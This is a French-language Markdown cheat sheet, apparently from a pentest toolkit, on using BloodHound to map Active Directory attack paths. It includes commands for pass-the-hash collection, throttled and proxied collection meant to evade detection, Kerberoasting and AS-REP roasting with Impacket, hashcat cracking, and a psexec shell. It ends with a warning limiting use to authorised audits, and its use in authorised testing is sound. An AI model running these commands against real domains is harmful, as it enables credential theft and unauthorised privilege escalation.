# 🩸 BloodHound - Active Directory Attack Path Mapper

## Description

BloodHound est un outil de cartographie et d'analyse d'Active Directory qui permet de :
- Visualiser les relations AD (utilisateurs, groupes, machines, GPO)
- Identifier les chemins d'attaque vers Domain Admin
- Détecter les mauvaises configurations
- Trouver les chemins d'élévation de privilèges
- Analyser les ACL (Access Control Lists)

**Composants :**
- **BloodHound** (frontend Neo4j + interface web)
- **BloodHound.py** (collecteur Python, version Kali)
- **SharpHound** (collecteur C#, pour Windows)

---

## Installation

✅ **BloodHound.py déjà installé dans Kali Headless**

```bash
# Vérifier l'installation
bloodhound-python --version

# Installer Neo4j (base de données graphe)
apt install neo4j -y

# Démarrer Neo4j
neo4j console
# Ou
systemctl start neo4j

# Accès web : http://localhost:7474
# Credentials par défaut : neo4j / neo4j (à changer au premier login)
```

---

## BloodHound.py - Collecte de données

### Syntaxe de base

```bash
bloodhound-python -u USERNAME -p PASSWORD -d DOMAIN -ns NAMESERVER -c All
```

---

## Exemples pratiques

### Exemple 1 : Collecte basique

```bash
# Collecte complète (depuis Linux)
bloodhound-python -u john.doe -p 'Password123!' \
  -d contoso.local \
  -ns 192.168.1.10 \
  -c All

# Options :
# -u : username
# -p : password
# -d : domaine AD
# -ns : DNS/Domain Controller IP
# -c : collection method (All, DCOnly, Session, etc.)
```

**Résultat :**
```
INFO: Found AD domain: contoso.local
INFO: Connecting to LDAP server: dc01.contoso.local
INFO: Done in 00M 32S
INFO: Compressing output into 20240221_bloodhound.zip
```

**Fichiers générés :**
- `computers.json`
- `users.json`
- `groups.json`
- `domains.json`
- `gpos.json`
- `ous.json`

---

### Exemple 2 : Méthodes de collection spécifiques

```bash
# Collecter uniquement les sessions
bloodhound-python -u user -p pass -d domain.local -ns 192.168.1.10 -c Session

# Collecter uniquement les infos du DC
bloodhound-python -u user -p pass -d domain.local -ns 192.168.1.10 -c DCOnly

# Collecter ACL uniquement
bloodhound-python -u user -p pass -d domain.local -ns 192.168.1.10 -c ACL

# Méthodes disponibles :
# All       - Tout (recommandé)
# DCOnly    - Info DC uniquement
# Session   - Sessions utilisateurs
# LoggedOn  - Utilisateurs connectés
# Group     - Groupes et membres
# ACL       - Access Control Lists
# Trusts    - Trusts entre domaines
# Container - Containers et GPO
# ObjectProps - Propriétés des objets
```

---

### Exemple 3 : Authentification alternative

```bash
# Avec hash NTLM (Pass-the-Hash)
bloodhound-python -u administrator \
  --hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
  -d domain.local -ns 192.168.1.10 -c All

# Avec Kerberos ticket
bloodhound-python -u user -k -d domain.local -ns 192.168.1.10 -c All

# Avec fichier credentials
bloodhound-python --username-file users.txt \
  --password-file passwords.txt \
  -d domain.local -ns 192.168.1.10
```

---

### Exemple 4 : Collecte via proxy / stealth

```bash
# Via proxy SOCKS
bloodhound-python -u user -p pass -d domain.local -ns 192.168.1.10 \
  --socks-proxy 127.0.0.1:9050 \
  -c All

# Changer le délai entre requêtes (éviter détection)
bloodhound-python -u user -p pass -d domain.local -ns 192.168.1.10 \
  --throttle 5000 \
  -c All
# --throttle 5000 = 5 secondes entre requêtes
```

---

## Analyse avec BloodHound GUI

### Démarrage Neo4j et BloodHound

```bash
# 1. Démarrer Neo4j
sudo neo4j start

# 2. Démarrer BloodHound (interface graphique)
bloodhound

# 3. Se connecter
# URL: bolt://localhost:7687
# User: neo4j
# Pass: (défini lors du premier login)

# 4. Importer les données JSON
# Cliquer "Upload Data" → Sélectionner les fichiers JSON ou le ZIP
```

---

### Requêtes Cypher prédéfinies (queries)

**Dans BloodHound GUI, onglet "Queries" :**

#### Chemins vers Domain Admin
- **Find Shortest Path to Domain Admins**
- **Find Principals with DCSync Rights**

#### Comptes à risque
- **Find Computers with Unsupported Operating Systems**
- **Find AS-REP Roastable Users (No Kerberos Pre-Auth)**
- **Find Kerberoastable Users**

#### Mauvaises configurations
- **Find Computers where Domain Users are Local Admin**
- **Find Computers where Domain Users can RDP**
- **Find All Paths from Owned Principals**

#### Délégations dangereuses
- **Find Computers with Constrained Delegation**
- **Find Users with Constrained Delegation**

---

## Exemples de requêtes Cypher personnalisées

```cypher
// Trouver tous les chemins de "john.doe@domain.local" vers Domain Admins
MATCH (u:User {name:"JOHN.DOE@DOMAIN.LOCAL"}), (g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}),
p=shortestPath((u)-[*1..]->(g))
RETURN p

// Lister tous les utilisateurs Kerberoastable
MATCH (u:User {hasspn:true})
RETURN u.name, u.serviceprincipalnames

// Trouver les utilisateurs sans Kerberos Pre-Auth (AS-REP Roasting)
MATCH (u:User {dontreqpreauth:true})
RETURN u.name

// Trouver les machines où Domain Users ont LocalAdmin
MATCH (g:Group {name:"DOMAIN USERS@DOMAIN.LOCAL"})
MATCH (c:Computer)-[:AdminTo]->(g)
RETURN c.name

// Lister tous les Domain Admins
MATCH (g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (u:User)-[:MemberOf*1..]->(g)
RETURN u.name

// Trouver les GPO qui affectent Domain Admins
MATCH (g:GPO)-[:GPLink]->(o:OU)
MATCH (u:User)-[:MemberOf*1..]->(da:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
WHERE (u)-[:Contains*1..]->(o)
RETURN g.name, o.name
```

---

## Cas d'usage réels

### Scénario 1 : Pentest Active Directory

**Contexte :** Compromis initial avec un compte utilisateur standard.

```bash
# Phase 1 : Collecte de données
bloodhound-python -u john.doe -p 'Password123!' \
  -d contoso.local -ns 192.168.1.10 -c All \
  -o /tmp/bloodhound_data

# Phase 2 : Importer dans BloodHound GUI

# Phase 3 : Marquer le compte compromis comme "Owned"
# (clic droit sur le nœud → Mark User as Owned)

# Phase 4 : Requête "Shortest Path from Owned Principals"
# → Affiche le chemin le plus court vers Domain Admin

# Phase 5 : Suivre le chemin d'attaque suggéré
# Exemple : john.doe → IT Support Group → Server Admins → Domain Admins
```

---

### Scénario 2 : Kerberoasting

**Contexte :** Trouver et exploiter les comptes avec SPN.

```bash
# 1. Collecter les données BloodHound
bloodhound-python -u user -p pass -d domain.local -ns 192.168.1.10 -c All

# 2. Requête BloodHound : "Find Kerberoastable Users"

# 3. Extraire les TGS avec Impacket
GetUserSPNs.py domain.local/user:pass -dc-ip 192.168.1.10 -request

# 4. Cracker les TGS avec Hashcat
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

### Scénario 3 : AS-REP Roasting

**Contexte :** Exploiter les comptes sans Kerberos Pre-Auth.

```bash
# 1. Requête BloodHound : "Find AS-REP Roastable Users"

# 2. Extraire les AS-REP avec Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.1.10 -format hashcat

# 3. Cracker avec Hashcat
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

---

## SharpHound (collecteur Windows)

Si vous avez accès à une machine Windows dans le domaine :

```powershell
# Télécharger SharpHound
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe

# Exécuter SharpHound (PowerShell)
.\SharpHound.exe -c All -d contoso.local

# Ou version PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain contoso.local

# Récupérer le ZIP généré et importer dans BloodHound
```

---

## Options BloodHound.py

```bash
# Output directory custom
bloodhound-python -u user -p pass -d domain.local -ns 192.168.1.10 -c All \
  -o /tmp/bloodhound_output

# Zipper automatiquement les résultats
bloodhound-python -u user -p pass -d domain.local -ns 192.168.1.10 -c All \
  --zip

# Verbose mode (debug)
bloodhound-python -u user -p pass -d domain.local -ns 192.168.1.10 -c All \
  -v

# Spécifier le Global Catalog
bloodhound-python -u user -p pass -d domain.local -ns 192.168.1.10 \
  --global-catalog dc01.domain.local -c All

# Collecter depuis plusieurs domaines (forest)
bloodhound-python -u user -p pass -d domain.local -ns 192.168.1.10 \
  --collect-all-domains -c All
```

---

## Commandes Neo4j utiles

```bash
# Démarrer Neo4j
sudo neo4j start
sudo neo4j console  # mode foreground avec logs

# Arrêter Neo4j
sudo neo4j stop

# Statut Neo4j
sudo neo4j status

# Reset password Neo4j
sudo neo4j-admin set-initial-password newpassword

# Vider la base de données (réinitialiser)
# Dans BloodHound GUI : cliquer icône poubelle (Clear Database)

# Ou via Cypher :
MATCH (n) DETACH DELETE n
```

---

## Astuces

### Automatiser la collecte régulière

```bash
#!/bin/bash
# bloodhound_collect.sh

DATE=$(date +%Y%m%d_%H%M%S)
bloodhound-python -u svc_monitor -p 'MonitorPass!' \
  -d contoso.local -ns 192.168.1.10 -c All \
  -o /var/bloodhound/$DATE \
  --zip

# Envoyer par email
mail -s "BloodHound Daily Scan" admin@example.com < /var/bloodhound/$DATE.zip
```

### Combiner avec d'autres outils

```bash
# 1. BloodHound pour trouver les cibles
# 2. Impacket pour exploiter

# Exemple : Trouver machines où vous êtes Admin Local
# → Utiliser psexec.py ou wmiexec.py pour shell
psexec.py domain/user:pass@target_ip
```

---

## Ressources

- [BloodHound Official](https://github.com/BloodHoundAD/BloodHound)
- [BloodHound.py](https://github.com/fox-it/BloodHound.py)
- [BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
- [Active Directory Security Blog](https://adsecurity.org/)

---

## ⚠️ Avertissement légal

**BloodHound est un outil d'audit AD légitime, MAIS :**

**Autorisé :**
- Audits de sécurité autorisés
- Votre propre environnement AD
- Red Team avec accord écrit

**Interdit :**
- Réseaux d'entreprise sans permission
- Collecte de données AD non autorisée
- Exfiltration de données sensibles

**Conséquences :**
- Détection par EDR/SIEM
- Alertes de sécurité
- Poursuites légales

**Note :** BloodHound génère du trafic LDAP important. Utilisez avec précaution en production.
